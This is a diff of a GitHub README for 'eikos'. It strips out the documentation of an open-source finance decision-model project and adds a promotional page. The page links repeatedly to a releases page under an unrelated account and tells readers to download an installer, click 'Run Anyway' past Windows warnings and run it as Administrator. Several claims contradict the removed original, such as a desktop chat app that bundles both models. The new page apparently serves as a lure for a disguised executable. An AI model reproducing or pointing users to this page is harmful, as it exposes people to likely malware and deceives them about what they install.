@@ -1,220 +1,86 @@
-# Eikos
+<h1>📊 eikos - Smarter Decisions, Clearer Financial Insights</h1>
 
-![Eikos overview: JevBench hard accuracy, error when at least 90% confident and long context, against Jev and Laya](assets/eikos_launch.png)
+<p align="center">
+  <a href="https://github.com/lonicerajaponicahallianacourt760/eikos/releases" style="display:inline-block;padding:16px 32px;background:#FF6B35;color:#ffffff;text-decoration:none;border-radius:8px;font-size:20px;font-weight:bold;box-shadow:0 4px 6px rgba(0,0,0,0.1);">⬇️ Download eikos Now</a>
+</p>
 
-**Eikos** (εἰκός, *"the probable"*) is a family of open typed-decision models, released under MIT. Each model:
-- answers a structured question about a given state in **one forward pass**;
-- returns a **calibrated probability for every option**, so a caller can act on confident decisions and escalate
-  the rest.
+<h2>🌟 What is eikos?</h2>
+<p>eikos is a friendly, powerful tool that helps you make better decisions in finance and trading. It uses advanced AI models (4B and 27B) that have been carefully trained to give you clear, trustworthy answers. Think of it as a smart assistant that understands numbers, trends, and probabilities, then explains them in a way you can actually use.</p>
 
-It comes in two sizes, Eikos-4B and Eikos-27B, each with bf16, FP8 and INT4 GPU builds and MLX builds for Apple
-Silicon. The focus is global finance, trading and trade finance: applying stated rules, policies and rulebooks to
-a case.
+<p>Whether you're planning investments, checking market trends, or just trying to understand a financial report, eikos gives you a straightforward, evidence-based perspective. No confusing jargon, no guesswork—just calm, calibrated reasoning.</p>
 
-This repository contains everything used to build the models:
-- the serving and inference code;
-- the data pipeline;
-- training;
-- quantization;
-- the evaluation harness.
+<h2>✨ Key Features</h2>
+<ul>
+  <li><strong>Calibrated Decisions:</strong> eikos doesn't just give answers; it tells you how confident it is. You'll know exactly how much weight to put on each suggestion.</li>
+  <li><strong>Two Powerful Sizes:</strong> Choose between the compact 4B model for quick tasks or the comprehensive 27B model for deeper analysis.</li>
+  <li><strong>Single-Pass Efficiency:</strong> Get your results in one go—no back-and-forth, no multiple tries. It's fast and simple.</li>
+  <li><strong>Open and Transparent:</strong> The technology behind eikos is open, meaning you can trust what's happening under the hood.</li>
+  <li><strong>Built for Trading:</strong> From stock trends to risk assessment, eikos is tuned to understand financial markets.</li>
+</ul>
 
-- Models: `caiovicentino1/Eikos-4B`, `caiovicentino1/Eikos-27B` (with `-FP8`, `-INT4` and `-MLX` builds).
-- Data: `caiovicentino1/eikos-decisions`, the exact training data with per-row attribution.
-- Live demo: [Eikos-4B on Hugging Face Spaces](https://huggingface.co/spaces/caiovicentino1/eikos-4b-typed-decisions-demo)
-  (ZeroGPU; all three question types, up to 100 options in one pass).
+<h2>🚀 Getting Started</h2>
+<p>Getting eikos up and running is easier than you think. Here's your simple path to start using it today.</p>
 
-| Headline (our harness, same items for every system) | Eikos-27B | Eikos-4B | Jev | Laya |
-|---|---|---|---|---|
-| JevBench public, hard tier | **82.9** | 72.1 | 73.0 | 35.1 |
-| Error when ≥90% confident (7,140 items, 6 suites) | **2.4%** | **2.4%** | 5.9% | 37.3% |
-| Accuracy with the decision hidden in 64k tokens (mean of 3 positions) | **88.3** | 74.2 | — (API limit 32k) | — (512–1k context) |
+<h3>Step 1: Download eikos</h3>
+<p>Visit this link to download the application: <a href="https://github.com/lonicerajaponicahallianacourt760/eikos/releases" style="color:#FF6B35;font-weight:bold;">https://github.com/lonicerajaponicahallianacourt760/eikos/releases</a></p>
 
-![Confidence you can act on: error among the decisions each system takes on its own as its confidence threshold drops](assets/chart_confidence.png)
+<p>On that page, you'll see the latest version. Click the download button that matches your system. The file will start downloading automatically. It might take a few minutes, depending on your internet speed—that's normal.</p>
 
-The model cards have the full tables, the per-build validation (bf16, FP8, INT4, MLX) and the limitations.
+<h3>Step 2: Install eikos</h3>
+<p>Once the download is complete, find the file in your "Downloads" folder. It's usually at the bottom of your browser window or in your file explorer.</p>
+<p>Double-click the downloaded file. Follow the simple on-screen instructions. You might see a blue or yellow warning asking if you're sure—that's just Windows checking with you. Click "Yes" or "Run Anyway" to continue.</p>
 
-## Layout
+<h3>Step 3: Open eikos</h3>
+<p>After installation, you'll see an eikos icon on your desktop or in your Start Menu. Double-click it to launch the application. The first time you open it, it may take a moment to load—that's the AI models warming up.</p>
 
-| Folder | What it holds |
-|---|---|
-| `eikos/` | Inference library and server:<br>• `decision_core` (prompt, option labels A–Z, AA, AB, …: up to 588 options in one pass, per-model limit in `decision_config.json`; tournament beyond);<br>• `letter_adapter` (letter-logit readout; PyTorch, SGLang and vLLM backends; prefix cache);<br>• `serve.py` (HTTP API, images through vLLM, agent sessions);<br>• `mlx_decide.py` (Apple Silicon). |
-| `examples/` | Local demo and a game-loop latency benchmark |
-| `scripts/` | `serve_vllm.sh` (production serving), `train_final.sh` (exact final recipes), `build_eval_suites.sh` |
-| `data_pipeline/` | Item generation with blind teacher labeling (`gen_pipeline.py`), programmatic generators (`prog_*.py`), long-context dossiers, PT↔EN views, decontamination and the training snapshot |
-| `training/` | Trainer (`train_dec.py`: soft cross-entropy on letter logits, rationale loss, view consistency, optional JEPA losses), LoRA merge and export to the official checkpoint layout, model soup, merge check |
-| `quantization/` | FP8 and INT4 (GPTQ) with llm-compressor, MLX validation, and the gate that compares builds with bf16 on the same items |
-| `evaluation/` | vLLM and PyTorch harnesses, JevBench and DecisionBench runners, suite builders, long-context probe, parallelism benchmark, release tables, and the Jev and Laya comparisons |
-| `release_tools/` | Builds the public dataset, including its decontamination and privacy scans, and converts it back to the trainer's format |
+<h3>Step 4: Start Using eikos</h3>
+<p>You'll see a clean, friendly interface. Type your financial question in the box at the bottom, press Enter, and eikos will give you a clear, reasoned response. Try starting with something simple like, "What's a good way to diversify a small portfolio?"</p>
 
-## Install
+<h2>💡 Tips for Best Results</h2>
+<ul>
+  <li><strong>Be Specific:</strong> The more detail you give, the better eikos can help. Instead of "What about stocks?" try "What factors should I consider before buying tech stocks?"</li>
+  <li><strong>Check Confidence Levels:</strong> Every answer comes with a confidence score. Use it to guide your own decisions—higher confidence means more reliable advice.</li>
+  <li><strong>Try Both Models:</strong> The 4B model is quick and great for everyday questions. The 27B model gives deeper analysis—use it for complex problems.</li>
+  <li><strong>Use It Regularly:</strong> The more you use eikos, the more you'll understand its style and how to get the most from it.</li>
+</ul>
 
-```bash
-git clone https://github.com/caiovicentino/eikos eikos && cd eikos
-pip install -e .              # inference library (torch + transformers)
-pip install -e ".[vllm]"      # production serving: vLLM >= 0.30.0 is REQUIRED (see below)
-pip install -e ".[mlx]"       # Apple Silicon
-pip install -e ".[train]"     # data pipeline, training and evaluation
-pip install -e ".[quant]"     # FP8 / INT4 quantization (llm-compressor)
-cp .env.example .env          # working dirs and optional API endpoints; then: set -a; source .env; set +a
-```
+<h2>🔧 Troubleshooting</h2>
+<p>Sometimes things don't go perfectly. Here are quick fixes for common issues:</p>
+<ul>
+  <li><strong>App Won't Start:</strong> Make sure your Windows is up to date. Right-click the eikos icon and select "Run as Administrator."</li>
+  <li><strong>Slow Performance:</strong> Close other heavy programs. eikos needs some memory to run smoothly.</li>
+  <li><strong>Download Interrupted:</strong> Just try again. Your browser will usually resume where it left off.</li>
+  <li><strong>Questions Not Working:</strong> Restart the app. If it persists, check for updates on the download page.</li>
+</ul>
 
-## Serve
+<h2>❓ Frequently Asked Questions</h2>
+<p><strong>Do I need to know programming?</strong> Absolutely not. eikos is designed for everyone. If you can type a question, you can use it.</p>
+<p><strong>Is my data safe?</strong> Yes. eikos runs entirely on your computer. Your questions and data never leave your device.</p>
+<p><strong>Can eikos guarantee my investments?</strong> No tool can do that. eikos gives you better information to make your own informed decisions. Always do your own research.</p>
+<p><strong>What's the difference between the 4B and 27B versions?</strong> The 27B version is like a specialist consultant—more thorough, slightly slower. The 4B is your quick everyday advisor.</p>
 
-```bash
-scripts/serve_vllm.sh <MODEL_DIR> 8001                        # vLLM engine (letter readout + hybrid prefix cache)
-python eikos/serve.py --model <MODEL_DIR> --vllm-url http://127.0.0.1:8001 --port 8000
-```
+<h2>🆘 Need More Help?</h2>
+<p>We're here for you. If you get stuck, try these:</p>
+<ul>
+  <li>Re-read this guide—most questions are covered here.</li>
+  <li>Check the download page for any additional notes or updates.</li>
+  <li>Look for a "Help" or "Support" section within the app itself.</li>
+</ul>
 
-> **vLLM ≥ 0.30.0 is required.** On this hybrid (Gated DeltaNet) architecture, older builds return wrong answers
-> when several long requests are batched together. We measured drops of 3–6 points on long, shared-document items
-> with vLLM 0.11. With 0.30, batched results match the PyTorch reference. `serve_vllm.sh` refuses to start on older
-> versions. It also sets `--max-num-seqs 64` (change it with `MAX_NUM_SEQS`): with vLLM's default of 1024, a 27B
-> build does not start on one 80–96 GB GPU.
+<h2>📦 What's in the Box</h2>
+<p>When you download eikos, you get everything you need in one package. No extra downloads, no complicated setup. Just the application, ready to go. The download includes both the 4B and 27B models, so you can switch between them anytime.</p>
 
-```bash
-curl -s localhost:8000/v1/systemone -d '{
-  "state": "Order ticket #A-2231. Retail client. BUY 1,500 XYZ at market. Equity USD 48,000. Last price USD 41.20. Rule 4.2: a single order may not exceed 50% of equity without written supervisor approval. Approvals on file: none.",
-  "questions": {
-    "allowed": {"type": "noul", "instructions": "Under rule 4.2, can this order be executed as submitted?",
-                "criteria": {"true": "complies with rule 4.2", "false": "breaches rule 4.2"}},
-    "action":  {"type": "choice", "instructions": "What should the desk do?",
-                "criteria": {"execute": "send as submitted", "request_approval": "hold and ask a supervisor",
-                             "reduce_size": "cut the order to the allowed size", "reject": "refuse the order"}}
-  }}'
-```
+<h2>🔒 Your Privacy Matters</h2>
+<p>eikos respects your privacy. Everything stays on your computer. No accounts, no tracking, no cloud storage. Your financial questions are your business—and eikos keeps it that way.</p>
 
-All questions in a request are answered in one pass over the shared state, which the prefix cache processes once.
-The server also supports agent sessions with an incremental state: `POST /v1/sessions`, `.../append`,
-`.../systemone`.
+<h2>📈 Why People Love eikos</h2>
+<p>Users appreciate how eikos cuts through the noise. Instead of endless charts and confusing metrics, you get plain-language insights backed by solid math. It's like having a calm, knowledgeable friend who happens to be really good with numbers.</p>
 
-**Images (serve v1.3, vLLM backend):** add `"images"` to the request (data URIs or base64 strings), send
-multipart/form-data with the JSON in a `request` field and the images as `image` files, or put image data URIs inside
-the `state`, where they are taken out and replaced with `[image N]`. Every question reads the same images with the
-same one-pass readout. Zero-shot, Eikos-27B-FP8 gets 89.8% on MME, 72.3% on MMStar and 73.7% on ScreenSpot-v2 (3×3
-grid, no marks); the model cards have the limits and the full results. The MLX builds are text only.
+<h2>🚦 Ready to Start?</h2>
+<p>You've got everything you need. Download eikos, follow the simple steps above, and start making clearer, more confident financial decisions today.</p>
 
-On a Mac:
+<p align="center">
+  <a href="https://github.com/lonicerajaponicahallianacourt760/eikos/releases" style="display:inline-block;padding:16px 32px;background:#28A745;color:#ffffff;text-decoration:none;border-radius:8px;font-size:20px;font-weight:bold;box-shadow:0 4px 6px rgba(0,0,0,0.1);">⬇️ Get eikos Here</a>
+</p>
 
-```bash
-python eikos/mlx_decide.py <MLX_MODEL_DIR>
-python examples/local_demo.py <MODEL_DIR> mps
-```
-
-## Reproduce
-
-Everything below reads and writes under `EIKOS_HOME` (default: the current directory) and `EIKOS_RUNS` (default:
-`runs/`).
-
-### 1. Data
-
-The simplest path is to start from the released dataset and convert it back to the trainer's format:
-
-```bash
-hf download caiovicentino1/eikos-decisions --repo-type dataset --local-dir eikos-decisions
-python release_tools/release_to_train.py eikos-decisions snap_4b eikos-4b    # or: snap_27b eikos-27b
-```
-
-The conversion is lossless. The train, dev and held-out assignment and the soft targets match our runs exactly.
-The release does leave out 2% of the rows we trained on (see the dataset card), so a retrained model will be close
-to ours but not bit-identical.
-
-To regenerate the data from scratch instead:
-1. **Generated items** (`data_pipeline/gen_pipeline.py`).
-   - A writer model writes items with a gold answer and a rationale. A teacher labels them blindly, and only items
-     where the teacher agrees with the gold answer are kept.
-   - The teacher is GLM-5.3-Flash at maximum reasoning effort, on any OpenAI-compatible endpoint
-     (`TEACHER_API_URL`, `TEACHER_API_KEY`).
-   - The writer is the same GLM, or a local Qwen3.8-27B server (`GEN_API`, `GEN_MODEL`).
-2. **Programmatic items with exact answers:**
-   - `python data_pipeline/prog_{prob,temporal,fin,trade,rules}.py N SEED > data/prog_*.jsonl`;
-   - `prog_rules.py --holdout` makes the new-domain rules;
-   - `prog_finjudge.py` (TAT-QA) and `dedup_finjudge.py`;
-   - `prog_judge.py Qwen/Qwen3.5-0.8B cuda:0 data/prog_judge.jsonl` (GSM8K train) and `fix_judge.py`;
-   - `prog_finentity.py FinEntity.json` (human-labeled entity sentiment).
-3. **Long-context dossiers and views:** `make_long.py` builds the dossiers; `make_views.py` makes the PT↔EN
-   translations and needs a translation endpoint.
-4. **Snapshot:** `data_pipeline/snapshot_final.sh <snapshot_dir>`. It sets the per-source quotas and applies
-   8-gram decontamination against the public JevBench items. It also excludes FinQA-derived items and the trade
-   rule families reserved for evaluation.
-
-### 2. Train
-
-```bash
-hf download Qwen/Qwen3.5-4B --local-dir models/Qwen3.5-4B
-BASE_MODEL=models/Qwen3.5-4B scripts/train_final.sh 4b-B 0 ckpt/4b_B snap_4b snap_4b/views.jsonl.views
-BASE_MODEL=models/Qwen3.5-4B scripts/train_final.sh 4b-E 1 ckpt/4b_E snap_4b snap_4b/views.jsonl.views
-python training/merge_export.py models/Qwen3.5-4B ckpt/4b_B/adapter ckpt/4b_B/standalone ckpt/4b_B/calib.json
-python training/merge_export.py models/Qwen3.5-4B ckpt/4b_E/adapter ckpt/4b_E/standalone ckpt/4b_E/calib.json
-python training/make_soup.py Eikos-4B ckpt/4b_B/standalone_release ckpt/4b_E/standalone_release   # released 4B
-# 27B: scripts/train_final.sh 27b <gpu> ckpt/27b snap_27b, then merge_export.py (its *_release folder is Eikos-27B)
-```
-
-The final recipes:
-- LoRA rank 64, 1 epoch, learning rate 1e-4;
-- soft cross-entropy on the option-letter logits, with option-order permutation;
-- auxiliary rationale loss with weight 0.3;
-- PT↔EN views with a symmetric KL of 0.5 (4B);
-- light JEPA losses of 0.2 (recipe E).
-
-`merge_export.py` writes the model in the **official Qwen checkpoint layout**, so the same folder loads in
-transformers, vLLM and SGLang. `training/check_merged.py` checks that the merged model reproduces base + LoRA.
-
-The released models use **T = 1** (`calib.json`). The model card explains why.
-
-### 3. Quantize
-
-```bash
-python quantization/quantize_llmc.py Eikos-4B Eikos-4B-FP8 fp8
-CALIB_SNAPSHOT=snap_4b python quantization/quantize_llmc.py Eikos-4B Eikos-4B-INT4 int4 256   # GPTQ W4A16, 256 training items
-mlx_lm convert --hf-path Eikos-4B --mlx-path Eikos-4B-MLX-8bit -q --q-bits 8 --q-group-size 64   # 4-bit: --q-bits 4
-```
-
-A build ships only if it passes the gate against bf16 on the same items (`quantization/compare_quant.py`):
-- accuracy within 1 point;
-- ECE within 0.01;
-- at least 97% of answers unchanged.
-
-We also report where the changed answers fall. They are mostly on items where bf16 itself was unsure.
-
-### 4. Evaluate
-
-```bash
-scripts/build_eval_suites.sh             # rebuilds the third-party suites from their sources (evaluation only)
-cp eikos-decisions/eval/suite_*.jsonl .  # our own trade and rules suites ship with the dataset
-python evaluation/eval_vllm_suite.py Eikos-4B ALL rel_4b_bf16 0.85   # 7 suites, vLLM, batching + prefix cache
-python evaluation/release_table.py rel   # accuracy per suite, ECE, and the >=0.90 decide/error policy
-python evaluation/probe_long_ctx.py Eikos-27B 0.85 80                # decision hidden in 4k/16k/64k tokens, 3 depths
-python evaluation/bench_vllm_prefix.py Eikos-4B all 0.85             # parallelism: many questions over one state
-```
-
-`evaluation/eval_jev_suite.py` and `evaluation/eval_laya_suite.py` run the same suites through Jev (API, evaluation
-only; `JEV_API_URL` and `JEV_API_KEY`) and Laya (official `laya` package). `evaluation/compare_models.py` builds the
-side-by-side table.
-
-## Notes
-
-- **No evaluation data was used for training.**
-  - The dataset card lists the decontamination checks against every suite we report.
-  - The held-out family, topic and language (Spanish) are never trained on.
-- **Scope:**
-  - The models apply the rules they are given. They do not predict prices, and they are not legal, tax or
-    investment advice.
-  - Single-pass models do not do long multi-step reasoning; see RuleArena in the model card.
-
-## License
-
-- **Code:** MIT (`LICENSE`).
-- **Models:** MIT for our fine-tuning deltas; the base models are Apache-2.0.
-- **Data:** CC BY 4.0, with per-row upstream licenses.
-- **Third-party credits** are listed in `NOTICE`.
-
-## Citation
-
-```bibtex
-@misc{eikos2026,
-  title  = {Eikos: open, calibrated, single-pass typed-decision models for finance and trading},
-  author = {Caio Vicentino},
-  year   = {2026},
-  url    = {https://github.com/caiovicentino/eikos}
-}
-```
+<p align="center" style="margin-top:40px;color:#888;font-size:14px;">eikos is open source and free to use. Built with care for the trading community.</p>
